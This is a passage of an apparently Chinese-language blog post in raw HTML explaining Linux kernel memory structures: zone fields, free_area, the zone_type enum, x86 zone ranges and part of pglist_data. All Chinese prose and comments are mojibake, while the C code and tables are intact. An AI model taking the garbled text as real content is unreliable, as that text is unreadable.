class="comment">/* chunk size for buddy add/remove */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* é¡µé¢é“¾è¡¨, åœ¨ pcp-lists ä¸Šå‚¨å­˜çš„ç‹¬ç«‹çš„è¿ç§»ç±»å‹ */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">lists</span>[<span class="title">MIGRATE_PCPTYPES</span>];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_pageset</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_pages</span> <span class="title">pcp</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">    s8 expire;</span><br><span class="line">    u16 vm_numa_stat_diff[NR_VM_NUMA_STAT_ITEMS];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SMP</span></span><br><span class="line">    s8 stat_threshold;</span><br><span class="line">    s8 vm_stat_diff[NR_VM_ZONE_STAT_ITEMS];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¯¥ç»“æ„ä½“ä¼šè¢«å­˜æ”¾åœ¨æ¯ä¸ª CPU è‡ªå·±ç‹¬ç«‹çš„ <code>.data..percpu</code> æ®µä¸­ï¼Œä»¥ CPU0 ä¸ºä¾‹ï¼Œç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤º</p><p><img src="https://i.loli.net/2021/12/03/1dCZA3IDpUK2xYg.png" alt="è‡ªå·±ç”»çš„å›¾.png"></p><h3 id="zone-start-pfnï¼šzone-çš„èµ·å§‹ç‰©ç†PFN"><a href="#zone-start-pfnï¼šzone-çš„èµ·å§‹ç‰©ç†PFN" class="headerlink" title="zone_start_pfnï¼šzone çš„èµ·å§‹ç‰©ç†PFN"></a>zone_start_pfnï¼šzone çš„èµ·å§‹ç‰©ç†PFN</h3><p>è¯¥å­—æ®µç”¨ä»¥æ ‡è¯†è¯¥ zone çš„èµ·å§‹ç‰©ç†<strong>é¡µå¸§ç¼–å·</strong>ï¼ˆpage frame numberï¼‰</p><h3 id="spanned-pagesï¼š-zone-å¯¹åº”çš„å†…å­˜åŒºåŸŸä¸­çš„-pages-æ€»æ•°ï¼ˆåŒ…æ‹¬ç©ºæ´ï¼‰"><a href="#spanned-pagesï¼š-zone-å¯¹åº”çš„å†…å­˜åŒºåŸŸä¸­çš„-pages-æ€»æ•°ï¼ˆåŒ…æ‹¬ç©ºæ´ï¼‰" class="headerlink" title="spanned_pagesï¼š zone å¯¹åº”çš„å†…å­˜åŒºåŸŸä¸­çš„ pages æ€»æ•°ï¼ˆåŒ…æ‹¬ç©ºæ´ï¼‰"></a>spanned_pagesï¼š zone å¯¹åº”çš„å†…å­˜åŒºåŸŸä¸­çš„ pages æ€»æ•°ï¼ˆåŒ…æ‹¬ç©ºæ´ï¼‰</h3><p>è¯¥å­—æ®µç”¨ä»¥æ ‡è¯†è¯¥ zone å¯¹åº”çš„å†…å­˜åŒºåŸŸä¸­çš„ pages æ€»æ•°, <strong>åŒ…æ‹¬ç©ºæ´</strong></p><h3 id="present-pagesï¼š-zone-ä¸­å­˜åœ¨çš„ç‰©ç†é¡µæ¡†æ•°"><a href="#present-pagesï¼š-zone-ä¸­å­˜åœ¨çš„ç‰©ç†é¡µæ¡†æ•°" class="headerlink" title="present_pagesï¼š zone ä¸­å­˜åœ¨çš„ç‰©ç†é¡µæ¡†æ•°"></a>present_pagesï¼š zone ä¸­å­˜åœ¨çš„ç‰©ç†é¡µæ¡†æ•°</h3><p>è¯¥å­—æ®µç”¨ä»¥æ ‡è¯†  zone ä¸­å®é™…å­˜åœ¨çš„ç‰©ç†é¡µæ¡†æ•°</p><h3 id="managed-pagesï¼šzone-ä¸­-buddy-system-ç®¡ç†çš„é¡µé¢æ•°é‡"><a href="#managed-pagesï¼šzone-ä¸­-buddy-system-ç®¡ç†çš„é¡µé¢æ•°é‡" class="headerlink" title="managed_pagesï¼šzone ä¸­ buddy system ç®¡ç†çš„é¡µé¢æ•°é‡"></a>managed_pagesï¼šzone ä¸­ buddy system ç®¡ç†çš„é¡µé¢æ•°é‡</h3><p>è¯¥å­—æ®µç”¨ä»¥æ ‡è¯† zone ä¸­ buddy system ç®¡ç†çš„é¡µé¢æ•°é‡</p><h3 id="free-area-ï¼šbuddy-system-æŒ‰ç…§-order-ç®¡ç†çš„é¡µé¢"><a href="#free-area-ï¼šbuddy-system-æŒ‰ç…§-order-ç®¡ç†çš„é¡µé¢" class="headerlink" title="**free_area**ï¼šbuddy system æŒ‰ç…§ order ç®¡ç†çš„é¡µé¢"></a>**free_area**ï¼šbuddy system æŒ‰ç…§ order ç®¡ç†çš„é¡µé¢</h3><p>è¯¥å­—æ®µç”¨ä»¥å­˜å‚¨ buddy system æŒ‰ç…§ order ç®¡ç†çš„é¡µé¢ï¼Œä¸ºä¸€ä¸ª <code>free_area</code> ç»“æ„ä½“æ•°ç»„ï¼Œè¯¥ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">free_area</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">free_list</span>[<span class="title">MIGRATE_TYPES</span>];</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>        nr_free;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>åœ¨ free_area ä¸­å­˜æ”¾çš„é¡µé¢é€šè¿‡è‡ªèº«çš„ç›¸åº”å­—æ®µè¿æ¥æˆåŒå‘é“¾è¡¨ç»“æ„ï¼Œè¿™é‡Œæ”¾ä¸€å¼  overview</p><p><img src="https://i.loli.net/2021/11/30/sOwdI5YMNUjLSib.png" alt="è‡ªå·±ç”»çš„å›¾.png"></p><p>free_area ä¸­å¹¶éåªæœ‰ä¸€ä¸ªåŒå‘é“¾è¡¨ï¼Œè€Œæ˜¯æŒ‰ç…§ä¸åŒçš„â€œè¿ç§»ç±»å‹â€ï¼ˆmigrate typeï¼‰è¿›è¡Œåˆ†å¼€å­˜æ”¾ï¼Œè¿™æ˜¯ç”±äº_é¡µé¢è¿ç§»_æœºåˆ¶çš„å­˜åœ¨</p><p>ä»¥ <em>free_list[0]</em> ä½œä¸ºä¾‹å­ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°å¦‚ä¸‹ overviewï¼š</p><p><img src="https://i.loli.net/2021/11/30/sbNImKo6tBS5GUe.png" alt="è‡ªå·±ç”»çš„å›¾.png"></p><h3 id="vm-statï¼šç»Ÿè®¡æ•°æ®"><a href="#vm-statï¼šç»Ÿè®¡æ•°æ®" class="headerlink" title="vm_statï¼šç»Ÿè®¡æ•°æ®"></a>vm_statï¼šç»Ÿè®¡æ•°æ®</h3><p>è¯¥æ•°ç»„ç”¨æ¥è¿›è¡Œæ•°æ®ç»Ÿè®¡ï¼ŒæŒ‰ç…§æšä¸¾ç±»å‹ <code>zone_stat_item</code> åˆ†ä¸ºå¤šä¸ªæ•°ç»„ï¼Œä»¥ç»Ÿè®¡ä¸åŒç±»å‹çš„æ•°æ®ï¼ˆæ¯”å¦‚è¯´ <code>NR_FREE_PAGES</code> è¡¨ç¤º zone ä¸­çš„ç©ºé—²é¡µé¢1æ•°é‡ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">zone_stat_item</span> &#123;</span></span><br><span class="line"><span class="comment">/* First 128 byte cacheline (assuming 64 bit words) */</span></span><br><span class="line">NR_FREE_PAGES,</span><br><span class="line">NR_ZONE_LRU_BASE, <span class="comment">/* Used only for compaction and reclaim retry */</span></span><br><span class="line">NR_ZONE_INACTIVE_ANON = NR_ZONE_LRU_BASE,</span><br><span class="line">NR_ZONE_ACTIVE_ANON,</span><br><span class="line">NR_ZONE_INACTIVE_FILE,</span><br><span class="line">NR_ZONE_ACTIVE_FILE,</span><br><span class="line">NR_ZONE_UNEVICTABLE,</span><br><span class="line">NR_ZONE_WRITE_PENDING,<span class="comment">/* Count of dirty, writeback and unstable pages */</span></span><br><span class="line">NR_MLOCK,<span class="comment">/* mlock()ed pages found and moved off LRU */</span></span><br><span class="line"><span class="comment">/* Second 128 byte cacheline */</span></span><br><span class="line">NR_BOUNCE,</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> IS_ENABLED(CONFIG_ZSMALLOC)</span></span><br><span class="line">NR_ZSPAGES,<span class="comment">/* allocated in zsmalloc */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">NR_FREE_CMA_PAGES,</span><br><span class="line">NR_VM_ZONE_STAT_ITEMS &#125;;</span><br></pre></td></tr></table></figure><h3 id="flagsï¼šæ ‡å¿—ä½-1"><a href="#flagsï¼šæ ‡å¿—ä½-1" class="headerlink" title="flagsï¼šæ ‡å¿—ä½"></a>flagsï¼šæ ‡å¿—ä½</h3><p>è¯¥ zone çš„æ ‡å¿—ä½ï¼Œç”¨ä»¥æ ‡è¯†å…¶æ‰€å¤„çš„çŠ¶æ€</p><h2 id="II-zone-çš„åˆ†ç±»"><a href="#II-zone-çš„åˆ†ç±»" class="headerlink" title="II.zone çš„åˆ†ç±»"></a>II.zone çš„åˆ†ç±»</h2><p>åœ¨ Linux kernel å½“ä¸­ï¼Œæˆ‘ä»¬æ ¹æ®å†…å­˜åŒºæ®µçš„ä¸åŒç”¨é€”ï¼Œå°†å…¶åˆ’åˆ†ä¸ºä¸åŒçš„ zoneï¼Œåœ¨ <code>/include/linux/mmzone.h</code> ä¸­æœ‰ç€ç›¸åº”çš„æšä¸¾å®šä¹‰ï¼Œå¦‚ä¸‹ï¼š</p><blockquote><p>æ‘†çƒ‚äº†ï¼Œå¯èƒ½æŸå¤©æƒ³èµ·æ¥ä¼šè¡¥å……ç¿»è¯‘</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">zone_type</span> &#123;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * ZONE_DMA and ZONE_DMA32 are used when there are peripherals not able</span></span><br><span class="line"><span class="comment">     * to DMA to all of the addressable memory (ZONE_NORMAL).</span></span><br><span class="line"><span class="comment">     * On architectures where this area covers the whole 32 bit address</span></span><br><span class="line"><span class="comment">     * space ZONE_DMA32 is used. ZONE_DMA is left for the ones with smaller</span></span><br><span class="line"><span class="comment">     * DMA addressing constraints. This distinction is important as a 32bit</span></span><br><span class="line"><span class="comment">     * DMA mask is assumed when ZONE_DMA32 is defined. Some 64-bit</span></span><br><span class="line"><span class="comment">     * platforms may need both zones as they support peripherals with</span></span><br><span class="line"><span class="comment">     * different DMA addressing limitations.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_ZONE_DMA</span></span><br><span class="line">    ZONE_DMA,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_ZONE_DMA32</span></span><br><span class="line">    ZONE_DMA32,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Normal addressable memory is in ZONE_NORMAL. DMA operations can be</span></span><br><span class="line"><span class="comment">     * performed on pages in ZONE_NORMAL if the DMA devices support</span></span><br><span class="line"><span class="comment">     * transfers to all addressable memory.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    ZONE_NORMAL,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_HIGHMEM</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * A memory area that is only addressable by the kernel through</span></span><br><span class="line"><span class="comment">     * mapping portions into its own address space. This is for example</span></span><br><span class="line"><span class="comment">     * used by i386 to allow the kernel to address the memory beyond</span></span><br><span class="line"><span class="comment">     * 900MB. The kernel will set up special mappings (page</span></span><br><span class="line"><span class="comment">     * table entries on i386) for each page that the kernel needs to</span></span><br><span class="line"><span class="comment">     * access.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    ZONE_HIGHMEM,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * ZONE_MOVABLE is similar to ZONE_NORMAL, except that it contains</span></span><br><span class="line"><span class="comment">     * movable pages with few exceptional cases described below. Main use</span></span><br><span class="line"><span class="comment">     * cases for ZONE_MOVABLE are to make memory offlining/unplug more</span></span><br><span class="line"><span class="comment">     * likely to succeed, and to locally limit unmovable allocations - e.g.,</span></span><br><span class="line"><span class="comment">     * to increase the number of THP/huge pages. Notable special cases are:</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 1. Pinned pages: (long-term) pinning of movable pages might</span></span><br><span class="line"><span class="comment">     *    essentially turn such pages unmovable. Memory offlining might</span></span><br><span class="line"><span class="comment">     *    retry a long time.</span></span><br><span class="line"><span class="comment">     * 2. memblock allocations: kernelcore/movablecore setups might create</span></span><br><span class="line"><span class="comment">     *    situations where ZONE_MOVABLE contains unmovable allocations</span></span><br><span class="line"><span class="comment">     *    after boot. Memory offlining and allocations fail early.</span></span><br><span class="line"><span class="comment">     * 3. Memory holes: kernelcore/movablecore setups might create very rare</span></span><br><span class="line"><span class="comment">     *    situations where ZONE_MOVABLE contains memory holes after boot,</span></span><br><span class="line"><span class="comment">     *    for example, if we have sections that are only partially</span></span><br><span class="line"><span class="comment">     *    populated. Memory offlining and allocations fail early.</span></span><br><span class="line"><span class="comment">     * 4. PG_hwpoison pages: while poisoned pages can be skipped during</span></span><br><span class="line"><span class="comment">     *    memory offlining, such pages cannot be allocated.</span></span><br><span class="line"><span class="comment">     * 5. Unmovable PG_offline pages: in paravirtualized environments,</span></span><br><span class="line"><span class="comment">     *    hotplugged memory blocks might only partially be managed by the</span></span><br><span class="line"><span class="comment">     *    buddy (e.g., via XEN-balloon, Hyper-V balloon, virtio-mem). The</span></span><br><span class="line"><span class="comment">     *    parts not manged by the buddy are unmovable PG_offline pages. In</span></span><br><span class="line"><span class="comment">     *    some cases (virtio-mem), such pages can be skipped during</span></span><br><span class="line"><span class="comment">     *    memory offlining, however, cannot be moved/allocated. These</span></span><br><span class="line"><span class="comment">     *    techniques might use alloc_contig_range() to hide previously</span></span><br><span class="line"><span class="comment">     *    exposed pages from the buddy again (e.g., to implement some sort</span></span><br><span class="line"><span class="comment">     *    of memory unplug in virtio-mem).</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * In general, no unmovable allocations that degrade memory offlining</span></span><br><span class="line"><span class="comment">     * should end up in ZONE_MOVABLE. Allocators (like alloc_contig_range())</span></span><br><span class="line"><span class="comment">     * have to expect that migrating pages in ZONE_MOVABLE can fail (even</span></span><br><span class="line"><span class="comment">     * if has_unmovable_pages() states that there are no unmovable pages,</span></span><br><span class="line"><span class="comment">     * there can be false negatives).</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    ZONE_MOVABLE,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_ZONE_DEVICE</span></span><br><span class="line">    ZONE_DEVICE,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    __MAX_NR_ZONES</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="X86-32"><a href="#X86-32" class="headerlink" title="X86-32"></a>X86-32</h3><p>å¦‚ä¸‹è¡¨æ ¼æ‰€ç¤ºï¼ˆæ‡’å¾—æ‰¾å›¾äº†ï¼‰</p><table><thead><tr><th align="center">Type</th><th align="center">Start address</th><th align="center">End address</th></tr></thead><tbody><tr><td align="center">ZONE_DMA</td><td align="center">0MB</td><td align="center">16MB</td></tr><tr><td align="center">ZONE_NORMAL</td><td align="center">16MB</td><td align="center">896MB</td></tr><tr><td align="center">ZONE_HIGHMEM</td><td align="center">896MB</td><td align="center">â€¦</td></tr></tbody></table><p>é€šå¸¸æˆ‘ä»¬ç®€å•åœ°åˆ’åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼š</p><ul><li><code>çº¿æ€§æ˜ å°„åŒº</code>ï¼ˆå‰ 896MBï¼‰ï¼šè¿™ä¸€å—å†…å­˜ç›´æ¥æ˜ å°„åˆ°ç‰©ç†å†…å­˜åœ°å€ 0 èµ·å§‹å¾€åçš„æ€»è®¡ 896MBï¼Œä¸º<strong>çº¿æ€§æ˜ å°„</strong></li><li><code>é«˜ç«¯å†…å­˜</code>ï¼ˆä» 896MB å¼€å§‹å¾€åï¼‰ï¼šè¿™ä¸€å—å†…å­˜çš„æ˜ å°„æ˜¯<strong>ä¸è¿ç»­çš„</strong></li></ul><h3 id="X86-64"><a href="#X86-64" class="headerlink" title="X86-64"></a>X86-64</h3><p>å¦‚ä¸‹è¡¨æ ¼æ‰€ç¤ºï¼ˆæ‡’å¾—æ‰¾å›¾äº†ï¼‰</p><table><thead><tr><th align="center">Type</th><th align="center">Start address</th><th align="center">End address</th></tr></thead><tbody><tr><td align="center">ZONE_DMA</td><td align="center">0MB</td><td align="center">16MB</td></tr><tr><td align="center">ZONE_DMA32</td><td align="center">16MB</td><td align="center">4GB</td></tr><tr><td align="center">ZONE_NORMAL</td><td align="center">4GB</td><td align="center">â€¦</td></tr></tbody></table><p>åœ¨ 64 ä½çš„ Linux kernel ä¸­æ²¡æœ‰äº†â€œé«˜ç«¯å†…å­˜â€è¿™ä¸€æ¦‚å¿µ</p><h1 id="0x03-struct-pglist-dataï¼šèŠ‚ç‚¹"><a href="#0x03-struct-pglist-dataï¼šèŠ‚ç‚¹" class="headerlink" title="0x03.struct pglist_dataï¼šèŠ‚ç‚¹"></a>0x03.struct pglist_dataï¼šèŠ‚ç‚¹</h1><p>zone å†å‘ä¸Šä¸€å±‚ä¾¿æ˜¯<strong>èŠ‚ç‚¹</strong>â€”â€”Linux å°†_å†…å­˜æ§åˆ¶å™¨ï¼ˆmemory controllerï¼‰_ä½œä¸ºèŠ‚ç‚¹åˆ’åˆ†çš„ä¾æ®ï¼Œå¯¹äº UMA æ¶æ„è€Œè¨€åªæœ‰ä¸€ä¸ªèŠ‚ç‚¹ï¼Œè€Œå¯¹äº NUMA æ¶æ„è€Œè¨€é€šå¸¸æœ‰å¤šä¸ªèŠ‚ç‚¹ï¼Œå¯¹äºåŒä¸€ä¸ªå†…å­˜æ§åˆ¶å™¨ä¸‹çš„ CPU è€Œè¨€å…¶å¯¹åº”çš„èŠ‚ç‚¹ç§°ä¹‹ä¸º_æœ¬åœ°å†…å­˜_ï¼Œä¸åŒå¤„ç†å™¨ä¹‹é—´é€šè¿‡æ€»çº¿è¿›è¡Œè¿›ä¸€æ­¥çš„è¿æ¥ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œä¸€ä¸ªMCå¯¹åº”ä¸€ä¸ªèŠ‚ç‚¹ï¼š</p><p><img src="https://i.loli.net/2021/11/27/hAopSNYg23VeWzq.png" alt="image.png"></p><p>ä¸€ä¸ªèŠ‚ç‚¹ä½¿ç”¨ <code>pglist_data</code> ç»“æ„è¿›è¡Œæè¿°ï¼Œè¯¥ç»“æ„å®šä¹‰äº <code>/include/linux/mmzone.h</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * åœ¨ NUMA æœºå™¨ä¸Š, æ¯ä¸ª NUMA èŠ‚ç‚¹éƒ½æœ‰ä¸€ä¸ª pg_data_t ç”¨ä»¥æè¿°å…¶å†…å­˜å¸ƒå±€ã€‚</span></span><br><span class="line"><span class="comment"> * åœ¨ UMA æœºå™¨ä¸Šåˆ™åªæœ‰ä¸€ä¸ªå•ç‹¬çš„ pglist_data æè¿°æ•´ä¸ªå†…å­˜ã€‚</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * å†…å­˜ç»Ÿè®¡æ•°æ®ä¸é¡µç½®æ¢æ•°æ®ç»“æ„ç”±ä¸€ä¸ª per-zone basisç»´æŒ</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span> &#123;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * node_zones å­—æ®µåŒ…å«è¯¥èŠ‚ç‚¹æ‰€æ‹¥æœ‰çš„ zonesã€‚ å¹¶éæ‰€æœ‰çš„ zone éƒ½å·²è¢«å¡«å……ï¼Œä½†è¿™æ˜¯ä¸€ä¸ªæ»¡çš„åˆ—è¡¨ã€‚</span></span><br><span class="line"><span class="comment">     * å®ƒè¢«è¯¥èŠ‚ç‚¹çš„ node_zonelists ä»¥åŠå…¶ä»–èŠ‚ç‚¹çš„ node_zonelists æ‰€å¼•ç”¨.</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">zone</span> <span class="title">node_zones</span>[<span class="title">MAX_NR_ZONES</span>];</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * node_zonelists åŒ…å«æœ‰å¯¹æ‰€æœ‰èŠ‚ç‚¹ä¸­æ‰€æœ‰åŒºçš„å¼•ç”¨ã€‚</span></span><br><span class="line"><span class="comment">     * é€šå¸¸ç¬¬ä¸€ä¸ªåŒºå°†ä¼šä½œä¸ºè¯¥èŠ‚ç‚¹çš„ node_zones çš„å¼•ç”¨.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">zonelist</span> <span class="title">node_zonelists</span>[<span class="title">MAX_ZONELISTS</span>];</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> nr_zones; <span class="comment">/* è¯¥èŠ‚ç‚¹ä¸­è¢«å¡«å……çš„ zone çš„æ•°é‡ */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_FLAT_NODE_MEM_MAP    <span class="comment">/* å³ SPARSEMEM */</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">node_mem_map</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PAGE_EXTENSION</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page_ext</span> *<span class="title">node_page_ext</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_MEMORY_HOTPLUG) || defined(CONFIG_DEFERRED_STRUCT_PAGE_INIT)</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * è‹¥ä½ æœŸæœ› node_start_pfn, node_present_pages, </span></span><br><span class="line"><span class="comment">     * node_spanned_pages æˆ– nr_zones ä¿æŒä¸å˜ï¼Œ</span></span><br><span class="line"><span class="comment">     * å¿…é¡»åœ¨ä»»ä½•æ—¶åˆ»æŒæœ‰ï¼ˆè¿™ä¸ªé”ï¼‰ã€‚</span></span><br><span class="line"><span class="comment">     * åŒæ—¶åœ¨ deferred page åˆå§‹åŒ–æœŸé—´å¯¹ pgdat-&gt;first_deferred_pfn è¿›è¡ŒåŒæ­¥ã€‚</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * ï¼ˆå†…æ ¸ï¼‰æä¾›äº† pgdat_resize_lock() ä¸ pgdat_resize_unlock() </span></span><br><span class="line"><span class="comment">     * ä»¥åœ¨æ²¡æœ‰å¯¹ CONFIG_MEMORY_HOTPLUG æˆ– CONFIG_DEFERRED_STRUCT_PAGE_INIT</span></span><br><span class="line"><span class="comment">     * è¿›è¡Œæ£€æŸ¥çš„æƒ…å†µä¸‹æ“çºµ node_size_lock </span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * åŸºäº zone-&gt;lock ä¸ zone-&gt;span_seqlock</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">spinlock_t</span> node_size_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> node_start_pfn;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> node_present_pages; <span class="comment">/* æ‰€æœ‰ç‰©ç†é¡µçš„æ•°é‡ */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> node_spanned_pages; <span class="comment">/* 